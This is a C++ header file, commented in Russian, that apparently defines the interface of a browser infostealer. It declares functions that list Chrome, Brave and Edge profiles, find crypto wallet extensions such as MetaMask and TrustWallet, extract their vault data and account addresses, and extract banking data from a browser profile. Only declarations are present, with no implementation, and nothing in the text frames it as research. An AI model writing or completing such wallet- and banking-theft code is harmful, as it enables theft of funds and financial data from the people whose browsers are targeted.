#pragma once
#include <string>
#include <vector>

// Результат поиска кошелька
struct FoundWallet {
    std::string walletType;      // "MetaMask", "TrustWallet" и т.д.
    std::string browser;         // "chrome", "brave", "edge"
    std::string profile;         // "Default", "Profile 1" и т.д.
    std::string vaultData;       // JSON-строка vault (или сырая строка)
    std::vector<std::string> accounts; // ETH/SOL адреса и др.
};

// Описание расширения кошелька
struct WalletExtension {
    std::string name;                  // Название
    std::string chromeId;              // Extension ID (для Chromium-браузеров)
    std::vector<std::string> searchKeys; // Ключи поиска
};

// Список всех поддерживаемых кошельков
std::vector<WalletExtension> GetSupportedWallets();

// Список профилей браузеров (browser, profile_path)
std::vector<std::pair<std::string, std::string>> GetBrowserProfiles();

// Поиск всех кошельков
std::vector<FoundWallet> ExtractAllWallets();

// Поиск банковской информации
std::vector<std::string> ExtractBankingData(const std::string& profilePath);

